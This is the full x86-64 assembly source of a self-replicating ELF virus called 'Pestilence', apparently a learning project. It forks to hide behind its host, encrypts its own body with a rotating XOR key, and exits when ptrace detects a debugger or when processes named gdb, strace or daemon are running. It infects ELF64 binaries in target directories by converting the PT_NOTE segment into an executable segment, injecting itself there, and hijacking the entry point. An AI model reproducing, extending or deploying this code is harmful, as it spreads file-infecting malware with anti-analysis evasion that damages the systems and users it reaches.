%include "pestilence.inc"

global _start
section .text

_start:
		; Fork process => Parent resumes host activity while Child does virus stuff
		mov rax, SYSCALL_FORK
		syscall
		cmp rax, 0
		jz .saveState

; Get address of host entry and jump to it [Parent]
.jumpToHost:
		lea rax, [rel _start]
		sub rax, [rel payloadEntry]
		add rax, [rel hostEntry]
		jmp rax

.saveState:
		; Save common registers
		push rdi
		push rsi
		push rcx
		push rdx

		; Allocate space in stack for pestilence struct
		enter s_pestilence_size, 0

.decryptPayload:
		lea rdi, [rel _start.antiDebugMeasures]
		mov rsi, ENCRYPTION_SIZE
		mov rdx, [rel encryptionKey]

		cmp rdx, 0
		je .antiDebugMeasures
		call rotativeXOR

.encryptionStart:
.antiDebugMeasures:
		; Simple Anti Debug
		mov rax, SYSCALL_PTRACE
		xor rdi, rdi
		syscall
		cmp rax, -1
		je noDebugAllowed

		call findDaemonProcess
		cmp rax, 0
		jnz finish

		lea rdi, [rel infectDirectories]

.openDir:
		; Save RDI for later
		mov r8, rdi

		mov rax, SYSCALL_OPEN
		; RDI => Dirname
		mov rsi, O_RDONLY | O_DIRECTORY
		syscall

		; If fail, open next
		cmp rax, 0
		jl .nextDir

		; Save directory fd in pestilence struct
		mov VALUE(s_pestilence.dir_fd), rax

.readDir:
		; Get directory entries
		mov rax, SYSCALL_GETDENTS
		mov rdi, VALUE(s_pestilence.dir_fd)
		lea rsi, VALUE(s_pestilence.dirents)
		mov rdx, DIRENT_ARR_SIZE
		syscall

		; 0 means no more entries, -1 means error
		cmp rax, 0
		jle .closeDir

		; Save entry array size in R9
		mov r9, rax

		; R13 is offset in entry array, starts at 0
		xor r10, r10

.loopEntries:
		; Get current entry
		lea rdi, VALUE(s_pestilence.dirents)
		add rdi, r10

		; Get entry type (last byte of entry)
		movzx edx, word [rdi + dirent.d_reclen]
		mov al, byte [rdi + rdx - 1]

		; Increment offset to next entry in array
		add r10, rdx

		; Check if entry is regular file
		cmp al, DT_REG
		jne .nextEntry

		; Entry is file, move filename to RDI and open file
		add rdi, dirent.d_name
		mov rsi, r8
		call processFile

.nextEntry:
		; Compare current offset with array size
		cmp r10, r9
		jl .loopEntries

		; Reached end of array, get more entries
		jmp .readDir

.closeDir:
		mov rax, SYSCALL_CLOSE
		mov rdi, VALUE(s_pestilence.dir_fd)
		syscall

; Get next directory by looking after terminating '\0'
.nextDir:
		mov al, 0
		mov ecx, -1
		mov rdi, r8
		repnz scasb
		cmp byte [rdi], 0
		jnz .openDir

; Restore stack and jump to host entry
finish:
		leave
		pop rdx
		pop rcx
		pop rsi
		pop rdi

; Exit process with code 0 [Child]
die:
		mov rax, SYSCALL_EXIT
		mov rdi, 0
		syscall

noDebugAllowed:
		mov rax, SYSCALL_WRITE
		mov rdi, 1
		lea rsi, [rel debugMessage]
		mov rdx, DEBUG_MESSAGE_SIZE
		syscall
		jmp finish


; * * * * * * * * * * * * * * * * * * * * * * *
; Open file to check for ELF64 and infect it  *
; RDI => file name | RSI => directory name    *
; * * * * * * * * * * * * * * * * * * * * * * *
processFile:
		push r8
		push r9
		push r10

; Concatenate dirname and filename in buffer
.getFilePath:
		push rdi
		; RSI => dirname
		lea rdi, VALUE(s_pestilence.file_path)

.copyDirName:
		movsb
		cmp byte [rsi], 0
		jnz .copyDirName
		pop rsi

.copyFileName:
		movsb
		cmp byte [rsi - 1], 0
		jnz .copyFileName

.openFile:
		mov rax, SYSCALL_OPEN
		lea rdi, VALUE(s_pestilence.file_path)
		mov rsi, O_RDWR
		syscall

		cmp rax, 0
		jl .return
		mov VALUE(s_pestilence.file_fd), rax

; Call fstat() on file
.getFileSize:
		mov rax, SYSCALL_FSTAT
		mov rdi, VALUE(s_pestilence.file_fd)
		lea rsi, VALUE(s_pestilence.stat)
		syscall

		cmp rax, 0
		jnz .closeFile

		; Save file size in pestilence struct
		mov rsi, qword VALUE(s_pestilence.stat + stat.st_size)
		mov VALUE(s_pestilence.file_size), rsi

; Call mmap() on file, mmap syscall has special argument registers
.getFileMapping:
		mov rax, SYSCALL_MMAP
		xor rdi, rdi
		; RSI => file size
		mov rdx, PROT_READ | PROT_WRITE
		mov r10, MAP_SHARED
		mov r8, VALUE(s_pestilence.file_fd)
		xor r9, r9
		syscall

		cmp rax, MMAP_ERROR
		jae .closeFile

		; Save mapping in pestilence struct
		mov VALUE(s_pestilence.file_data), rax

		; Check if file is EL64
		mov rdi, rax
		call isElf64

		cmp rax, 0
		jz .unmap

		call injectVirus

.unmap:
		mov rax, SYSCALL_MUNMAP
		mov rdi, VALUE(s_pestilence.file_data)
		mov rsi, VALUE(s_pestilence.file_size)
		syscall

.closeFile:
		mov rax, SYSCALL_CLOSE
		mov rdi, VALUE(s_pestilence.file_fd)
		syscall

.return:
		pop r10
		pop r9
		pop r8
		ret


; * * * * * * * * * * * * * * * * * * * *
; Check if file is an ELF64 executable  *
; RDI => file mapping                   *
; * * * * * * * * * * * * * * * * * * * *
isElf64:
		xor rax, rax

.checkABI_VERSION:
		cmp qword [rdi + 8], 0
		jnz .return

.checkSYSV_GNU:
		mov rdx, ELF_SYSV
		cmp qword [rdi], rdx
		jz .checkELF64_DYN_EXEC

		mov rdx, ELF_GNU
		cmp qword [rdi], rdx
		jnz .return

.checkELF64_DYN_EXEC:
		mov rdx, ELF64_AND_DYN
		cmp qword [rdi + 16], rdx
		jz .setTrue

		mov rdx, ELF64_AND_EXEC
		cmp qword [rdi + 16], rdx
		jnz .return

.setTrue:
		inc rax

.return:
		ret


; * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
; Inject payload in binary by increasing the file size            *
; and putting the PT_NOTE segment at the end so we can hijack it  *
; RDI => file mapping                                             *
; * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
injectVirus:
		push r8
		push r9

		; Save File Mapping in R8
		mov r8, rdi

.checkAlreadyInfected:
		mov rdi, r8
		mov rsi, VALUE(s_pestilence.file_size)
		lea rdx, [rel signature]
		mov rcx, SIGNATURE_SIZE
		call ft_memmem

		cmp rax, 0
		jnz .return

.enlargeFile:
		mov rax, SYSCALL_FTRUNCATE
		mov rdi, VALUE(s_pestilence.file_fd)
		mov rsi, VALUE(s_pestilence.file_size)
		add rsi, PAGE_SIZE
		syscall

		cmp rax, 0
		jl .return

.remapFile:
		mov rax, SYSCALL_MREMAP
		mov rdi, r8
		mov rsi, VALUE(s_pestilence.file_size)
		mov rdx, rsi
		add rdx, PAGE_SIZE
		mov r10, 0x1 ; MREMAP_MAYMOVE
		xor r8, r8
		syscall

		cmp rax, MMAP_ERROR
		jae .return

		mov VALUE(s_pestilence.file_data), rax
		mov r8, rax

.getProgramHeaderInfo:
		movzx rcx, word [r8 + elf64_ehdr.e_phnum]
		mov rdi, qword [r8 + elf64_ehdr.e_phoff]
		add rdi, r8

; RDI => Program Header
.findNoteSegment:
		; If e_phnum is 0, we checked all the segments
		cmp rcx, 0
		jle .return

		cmp dword [rdi + elf64_phdr.p_type], PT_NOTE
		je .editNoteSegment

.nextSegment:
		add rdi, elf64_phdr_size
		dec rcx
		jmp .findNoteSegment

; RDI => Note Segment Program Header
.editNoteSegment:
		mov r9, rdi
		mov rax, VALUE(s_pestilence.file_size)

		mov dword [rdi + elf64_phdr.p_type], PT_LOAD
		mov dword [rdi + elf64_phdr.p_flags], 0x7 ; R W E
		mov qword [rdi + elf64_phdr.p_offset], rax ; End of file

		add rax, 0xc000000
		mov qword [rdi + elf64_phdr.p_paddr], rax ; Physical and Virtual address somewhere else
		mov qword [rdi + elf64_phdr.p_vaddr], rax

		mov qword [rdi + elf64_phdr.p_filesz], PAGE_SIZE ; Filesz and Memsz => 4096
		mov qword [rdi + elf64_phdr.p_memsz], PAGE_SIZE


; Copy PAYLOAD_SIZE bytes from _start to segment end
.injectPayload:
		mov rdi, r8
		add rdi, VALUE(s_pestilence.file_size)
		lea rsi, [rel _start]
		mov rcx, PAYLOAD_SIZE
		repnz movsb

; R9 => Note segment Program header
.patchELFHeader:
		; RDI => Far end of payload
		mov rdi, r8
		add rdi, VALUE(s_pestilence.file_size)
		add rdi, PAYLOAD_SIZE

		; Edit `payloadEntry`
		mov rsi, [r9 + elf64_phdr.p_offset]
		add rsi, 0xc000000
		mov qword [rdi - 16], rsi

		; Edit `hostEntry`
		mov rax, [r8 + elf64_ehdr.e_entry]
		mov qword [rdi - 8], rax

		; Edit file entry to payload start (virtual address)
		mov qword [r8 + elf64_ehdr.e_entry], rsi

; RDI => End of payload
.generateEncryptionKey:
		mov rax, SYSCALL_GETRANDOM
		lea rdi, [rdi - 24]
		mov rsi, 8
		xor rdx, rdx
		syscall

; RDI => Address of encrytion key
.encryptPayload:
		mov rdx, [rdi]

		mov rdi, r8
		add rdi, VALUE(s_pestilence.file_size)
		add rdi, (_start.encryptionStart - _start)

		mov rsi, ENCRYPTION_SIZE
		call rotativeXOR

.updateFileSize:
		add qword VALUE(s_pestilence.file_size), PAGE_SIZE

.return:
		pop r9
		pop r8
		ret


; * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
; Read the "/proc/<processID>/comm" file to look for process name *
; Return an address if process is named "daemon", NULL otherwise  *
; RDI => Process ID                                               *
; * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
isDaemon:
		push r8
		push r9

; Concatenate "/proc/", the processID, and the comm filename
.getFilePath:
		push rdi
		lea rsi, [rel processDirectory]
		lea rdi, VALUE(s_pestilence.file_path)

.copyDirname:
		movsb
		cmp byte [rsi], 0
		jnz .copyDirname
		pop rsi

.copyProcessID:
		movsb
		cmp byte [rsi], 0
		jnz .copyProcessID
		lea rsi, [rel processStatFile]

.copyCommFile:
		movsb
		cmp byte [rsi - 1], 0
		jnz .copyCommFile

; Open the 'comm' file
.openFile:
		mov rax, SYSCALL_OPEN
		lea rdi, VALUE(s_pestilence.file_path)
		mov rsi, O_RDONLY
		syscall
		mov r8, rax

		cmp rax, 0
		jl .return

; Read the 'comm' file (using the file path as buffer because fuck it)
.readFile:
		mov rdi, rax
		mov rax, SYSCALL_READ
		lea rsi, VALUE(s_pestilence.file_path)
		mov rdx, DAEMON_NAME_SIZE
		syscall

		lea rdi, [rel daemonName]

; Compare name of process
.isForbidden:
		mov r9, rdi
		lea rdi, VALUE(s_pestilence.file_path)
		mov rsi, DAEMON_NAME_SIZE
		mov rdx, r9
		mov rcx, DAEMON_NAME_SIZE
		call ft_memmem

.nextForbidden:
		mov al, 0
		mov ecx, -1
		mov rdi, r9
		repnz scasb
		cmp byte [rdi], 0
		jnz .isForbidden

; Close "/proc/<processID>/comm"
.close:
		push rax
		mov rax, SYSCALL_CLOSE
		mov rdi, r8
		syscall
		pop rax

.return:
		pop r9
		pop r8
		ret


; * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
; Browse every running process and look for one whose name is `daemonName`  *
; No arguments | Return true if process was found, false otherwise          *
; * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
findDaemonProcess:
		push r8
		push r9

; Open "/proc"
.openDir:
		mov rax, SYSCALL_OPEN
		lea rdi, [rel processDirectory]
		mov rsi, O_RDONLY | O_DIRECTORY
		syscall

		cmp rax, 0
		jl .return

		mov VALUE(s_pestilence.dir_fd), rax

; Get a new array of entries
.readDir:
		mov rax, SYSCALL_GETDENTS
		mov rdi, VALUE(s_pestilence.dir_fd)
		lea rsi, VALUE(s_pestilence.dirents)
		mov rdx, DIRENT_ARR_SIZE
		syscall

		cmp rax, 0
		jle .closeDir

		mov r8, rax
		xor r9, r9

; Loop the current array of entries
.loopEntries:
		; Get current entry
		lea rdi, VALUE(s_pestilence.dirents)
		add rdi, r9

		; Get entry type (last byte of entry)
		movzx edx, word [rdi + dirent.d_reclen]
		mov al, byte [rdi + rdx - 1]

		; Increment offset to next entry in array
		add r9, rdx

		; Check if entry is directory ("/proc/<processID>" is a directory)
		cmp al, DT_DIR
		jne .nextEntry

		; RDI is entry name
		add rdi, dirent.d_name

		; Check dirname doesnt start with '.'
		cmp byte [rdi], '.'
		je .nextEntry

		; Check if process is daemon process
		call isDaemon
		cmp rax, 0
		jg .closeDir

.nextEntry:
		; Compare current offset with size of current array of entry
		cmp r9, r8
		jl .loopEntries

		; Reached end of array, get more entries
		jmp .readDir

.closeDir:
		push rax
		mov rax, SYSCALL_CLOSE
		mov rdi, VALUE(s_pestilence.dir_fd)
		syscall
		pop rax

.return:
		pop r9
		pop r8
		ret

; * * * * * * * * * * * * * * * * * * * * * * * *
; Look for needle in haystack                   *
; Return address of needle in haystack or NULL  *
; RDI => haystack | RSI => haystack size        *
; RDX => needle | RCX => needle size            *
; * * * * * * * * * * * * * * * * * * * * * * * *
ft_memmem:
		push r8
		push r9

.init:
		dec rsi
		dec rcx
		mov r8, -1

.loop1:
		inc r8
		cmp r8, rsi
		jg .return_null
		mov r9, -1

.loop2:
		inc r9
		mov rax, r8
		add rax, r9
		cmp rax, rsi
		jg .loop1

		mov al, byte [rdi + rax]
		cmp al, byte [rdx + r9]
		jne .loop1

		cmp r9, rcx
		je .return_ptr
		jmp .loop2

.return_null:
		mov rax, 0
		jmp .return

.return_ptr:
		lea rax, [rdi + r8]

.return:
		pop r9
		pop r8
		ret

; This data will be encrypted so we can't read it
infectDirectories: db "/tmp/test/", 0, "/tmp/test2/", 0, 0
processDirectory: db "/proc/", 0
processStatFile: db "/comm", 0
daemonName: db "daemon", 0, "gdb", 0, "strace", 0, 0
debugMessage: db "DEBUGGING", 0

; Encryption ends here
encryptionEnd:

; * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
; Encrypt part of the payload using XOR encryption with a random rotating key *
; This function have to remain un-encrypted so it can be used for decryption  *
; RDI => start address | RSI => size | RDX => encryption key                  *
; * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
rotativeXOR:
	mov rcx, rsi
.startEncrypt:
	xor byte [rdi], dl
	ror rdx, 8
	inc rdi
	loop .startEncrypt
.done:
	ret

; This data has to stay un-encrypted
signature: db "Pestilence v1.0 (c)oded by tblaudez", 0
encryptionKey: dq 0x000000000000000
payloadEntry: dq _start
hostEntry: dq die
_end: